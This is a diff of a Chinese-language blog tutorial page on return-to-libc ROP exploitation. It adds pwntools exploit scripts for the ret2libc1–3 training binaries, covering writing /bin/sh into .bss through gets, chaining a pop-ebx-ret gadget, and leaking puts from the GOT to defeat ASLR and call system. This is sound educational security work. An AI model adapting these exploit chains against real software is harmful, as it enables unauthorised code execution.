@@ -164,21 +164,21 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2025-09-10 10:56:25
+          2025-09-17 13:06:35
         </span>
         
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
                 <span class="span--tag mr-8">
-                  <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
-                    #栈溢出
+                  <a href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" title="动态链接">
+                    #动态链接
                   </a>
                 </span>
                 
                 <span class="span--tag mr-8">
-                  <a href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" title="动态链接">
-                    #动态链接
+                  <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
+                    #栈溢出
                   </a>
                 </span>
                 
@@ -225,7 +225,7 @@
 <p>那么跟着前面的内容就能串起来，把<code>system address</code>直接换成<code>system@plt</code>就好了。</p>
 <p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250909230758974.png" alt="image-20250909230758974"></p>
 <p>这样就可以整个连接成一个攻击链路了。</p>
-<h2 id="实际案例ret2libc1">实际案例ret2libc1</h2>
+<h2 id="案例ret2libc1">案例ret2libc1</h2>
 <p>下面看一个真实案例<code>ret2libc1</code>程序。</p>
 <p>使用<code>IDA pro</code>进行反编译，明显的存在栈溢出漏洞。</p>
 <p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250910095227136.png" alt="image-20250910095227136"></p>
@@ -247,6 +247,69 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;../ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8048460</span></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, system_addr, <span class="string">b&#x27;B&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>成功获取shell。</p>
 <p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250910105532331.png" alt="image-20250910105532331"></p>
+<h2 id="案例ret2libc2无-bin-sh">案例ret2libc2无/bin/sh</h2>
+<p>下面我们看另一个实例，如果程序中不存在<code>/bin/sh</code>的字符串怎么办？如何去进行后续的利用？</p>
+<h3 id="方法一（gets函数输入）">方法一（gets函数输入）</h3>
+<p>这个案例和<code>ret2libc1</code>类似，只是少了一个<code>/bin/sh</code>，那么就使用<code>gets</code>函数输入。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250913220034097.png" alt="image-20250913220034097"></p>
+<p>查看<code>.got.plt</code>发现存在<code>gets</code>和<code>system</code>表项。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250913220306192.png" alt="image-20250913220306192"></p>
+<p>函数有了肯定是要有变量去承载我们输入的字符串的，查看<code>.bss</code>段内容，发现<code>buf2</code>。那么，只要把字符串写进<code>buf2</code>，然后<code>system</code>再调用，就可以成功完成这个攻击流程了。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250913220444323.png" alt="image-20250913220444323"></p>
+<p>设计payload如下：</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250913221104048.png" alt="image-20250913221104048"></p>
+<p>动态调试，查看详细需要进行注入的内容和相关的地址，和<code>re2libc1</code>类似，这里不再赘述了。</p>
+<p>下面编写利用的<code>ret2libc1_exp2.py</code>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;../ret2libc2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;../ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">buf2_addr = elf.symbols[<span class="string">&quot;buf2&quot;</span>] <span class="comment">#查找要写的buf2的地址</span></span><br><span class="line">gets_addr = elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">system_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span> + p32(gets_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>这个脚本中需要注意的内容是，<code>gets</code>函数需要我们将想要的字符进行输入，所以<code>sendline</code>了一个<code>b&quot;/bin/sh\x00&quot;</code>。其中<code>\x00</code>是为了防止换行符的输入，<code>sendline</code>就是在输入内容的末尾，再输入一个换行符。</p>
+<h3 id="方法二（使用ROP，更通用）">方法二（使用ROP，更通用）</h3>
+<p>前面了解了方法一，再去思考一下，<code>gets@plt</code>和<code>system@plt</code>在栈上一定是排在一起的嘛？能不能先调用<code>gets</code>函数，调用结束后，再去调用<code>system</code>函数？答案是可以的，反而这样理解起来更简单。</p>
+<p>再看方法一的利用方法，在栈中，当执行了<code>gets</code>函数以后，需要把栈中的<code>buf2</code>的内容进行出栈才能执行后续的函数部分。怎么出栈呢？找<code>pop</code>的<code>gadget</code>！把原来方法一的<code>system@plt</code>，换成<code>pop ebx ret</code>的指令，如下图所示：</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914104129773.png" alt></p>
+<p>使用<code>pop ebx ret</code>，刚好填补了两个字的间隔，使得<code>gets</code>函数成功获取其输入的参数，同时也能成功弹出<code>buf2</code>在栈中的内容。使用<code>pop ebx ret</code>，这里不一定必须<code>ebx</code>，只要是<strong>通用寄存器</strong>存放栈中弹出的数据就好了。</p>
+<p>思路清晰了以后，尝试去利用一下，先去程序中查找<code>pop ebx ret</code>类似的指令，使用<code>ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;</code>，如下：</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914113919754.png" alt="image-20250914113919754"></p>
+<p>找到了一条<code>0x0804843d : pop ebx ; ret</code></p>
+<p>优化一下方法一的脚本<code>ret2libc1_exp3.py</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;../ret2libc2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;../ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">buf2_addr = elf.symbols[<span class="string">&quot;buf2&quot;</span>] <span class="comment">#查找要写的buf2的地址</span></span><br><span class="line">gets_addr = elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">system_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_ebx_ret = <span class="number">0x0804843d</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span> + p32(gets_addr) + p32(pop_ebx_ret) + p32(buf2_addr) + p32(system_addr)  + p32(pop_ebx_ret) + p32(buf2_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>成功执行代码。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914114911641.png" alt="image-20250914114911641"></p>
+<h2 id="案例ret2libc3">案例ret2libc3</h2>
+<p>首先是<code>checksec</code>查看程序的安全配置。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914125111014.png" alt="image-20250914125111014"></p>
+<p>返回汇编代码，发现这里<code>read</code>了<code>0x100</code>的数据，即256字节到<code>src</code>变量中</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914144104991.png" alt="image-20250914144104991"></p>
+<p>跟进到<code>Print_message</code>函数中，查看汇编代码，发现将<code>src</code>复制到了<code>dest</code>中，<code>dest</code>变量只有56字节，所以说这里是存在栈溢出漏洞的。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914144249521.png" alt="image-20250914144249521"></p>
+<p>找到了漏洞点，思考一下整个的栈是什么样子的？</p>
+<p>栈内容大致如下，将<code>src</code>的空间较大，<code>dest</code>的空间较小，将<code>src</code>赋值到<code>dest</code>中会存在栈溢出。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914150558201.png" alt="image-20250914150558201"></p>
+<p>尝试去构造溢出的内容。想去利用<code>ret2text</code>发现没有后门函数，前面使用<code> checksec</code>，发现<code> NX: NX enabled</code>，<code>ret2shellcode</code>也是不行的，再看<code>rop</code>的<code>gadgets</code>就这几个，想去<code>ret2systemcall</code>，去构造<code>system</code>函数也是不行的。那就只能是<code>ret2libc</code>了看来。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914151454954.png" alt="image-20250914151454954"></p>
+<p>既然是<code>ret2libc</code>，那我们去找找程序中有无<code>/bin/sh</code>字符，发现没有。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914151749784.png" alt="image-20250914151749784"></p>
+<p>再去看看<code>plt</code>，发现没有<code>system</code>函数。但是，有<code>gets</code>函数，那么<code>/bin/sh</code>的问题就可以解决了。那么怎么去找<code>system</code>函数的真实地址呢？</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250914151858588.png" alt="image-20250914151858588"></p>
+<p>在反汇编程序后发现<code>See_something</code>是输出真实地址的函数。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250916223926376.png" alt="image-20250916223926376"></p>
+<p><code>ldd ret2libc3</code>查看文件，调用的动态链接库为<code>/lib/i386-linux-gnu/libc.so.6</code>，然后将其保存到当前的exp的脚本文件夹中。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250917120320636.png" alt="image-20250917120320636"></p>
+<p>从<code>libc.so.6</code>文件中找到<code>puts</code>函数的真实地址，计算<code>libc.so.6</code>中<code>system</code>和<code>puts</code>函数的实际地址偏差是多少。那么程序在运行后，虽然服务器开了<code>ASLR</code>，真实地址会变，但<strong>函数间的相对位置不会变</strong>。</p>
+<p>利用程序原本的函数<code>See_something</code>去查看<code>puts</code>函数的真实地址。</p>
+<p><code>elf.got[&quot;puts&quot;]</code>返回的是GOT条目在内存中的地址（一个指针变量的位置），这个地址里存放一个指针值，这个指针值在运行时会指向<code>puts</code>在<code>libc</code>中的真实地址。</p>
+<p>从下图可以看到，计算了基地址<code>libcBase</code>，然后还有<code>puts</code>函数和<code>system</code>函数的相对距离为176432。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250917124128276.png" alt="image-20250917124128276"></p>
+<p>计算<code>system</code>函数的真实地址</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250917125650577.png" alt="image-20250917125650577"></p>
+<p>真实的<code>system</code>地址找到了，开始尝试进行溢出攻击。</p>
+<p>对程序进行断点调试，计算覆盖的字节数<code>56 = 0xd2b8 - 0xd280</code>，再加上一个<code>ebp</code>寄存器的4个字节，一共要覆盖60个字节，下一个就是<code>return Address</code>，也就是<code>system</code>函数真实的地址。<img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250917105141560.png" alt="image-20250917105141560"></p>
+<p>构造溢出的结构如下：</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250917130145809.png" alt="image-20250917130145809"></p>
+<p>查找字符<code>sh</code>的地址<code>next(elf.search(b&quot;sh\x00&quot;))</code></p>
+<p><a target="_blank" rel="noopener" href="http://xn--exp-1d0fh15b22y.py">完整的exp.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&quot; : &quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">libcBase = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libcBase =&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libcBase))</span><br><span class="line"></span><br><span class="line">system_addr = libcBase + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">60</span>), system_addr, <span class="number">0x0deadbeef</span>, sh_addr])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行脚本。</p>
+<p><img src="/2025/09/02/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%AD%E7%9A%84ROP/image-20250917130503984.png" alt="image-20250917130503984"></p>
 <h2 id="参考">参考</h2>
 <hr class="footnotes-sep">
 <section class="footnotes">
@@ -274,21 +337,21 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2025-09-10 10:56:25
+              2025-09-17 13:06:35
             </span>
             
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
                     <span class="span--tag mr-8">
-                      <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
-                        #栈溢出
+                      <a href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" title="动态链接">
+                        #动态链接
                       </a>
                     </span>
                     
                     <span class="span--tag mr-8">
-                      <a href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" title="动态链接">
-                        #动态链接
+                      <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
+                        #栈溢出
                       </a>
                     </span>
                     
@@ -331,7 +394,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%B0%83%E7%94%A8%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">栈调用子函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%A0%88%E6%BA%A2%E5%87%BA%E5%86%85%E5%AE%B9"><span class="toc-text">构造栈溢出内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">构造栈溢出[3]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9E%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%93%AA%E9%87%8C%E6%9D%A5%EF%BC%9F"><span class="toc-text">真实函数地址哪里来？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8Bret2libc1"><span class="toc-text">实际案例ret2libc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%B0%83%E7%94%A8%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">栈调用子函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%A0%88%E6%BA%A2%E5%87%BA%E5%86%85%E5%AE%B9"><span class="toc-text">构造栈溢出内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">构造栈溢出[3]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9E%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%93%AA%E9%87%8C%E6%9D%A5%EF%BC%9F"><span class="toc-text">真实函数地址哪里来？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8Bret2libc1"><span class="toc-text">案例ret2libc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8Bret2libc2%E6%97%A0-bin-sh"><span class="toc-text">案例ret2libc2无&#x2F;bin&#x2F;sh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%88gets%E5%87%BD%E6%95%B0%E8%BE%93%E5%85%A5%EF%BC%89"><span class="toc-text">方法一（gets函数输入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%88%E4%BD%BF%E7%94%A8ROP%EF%BC%8C%E6%9B%B4%E9%80%9A%E7%94%A8%EF%BC%89"><span class="toc-text">方法二（使用ROP，更通用）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8Bret2libc3"><span class="toc-text">案例ret2libc3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
       
     </div>
   </div>
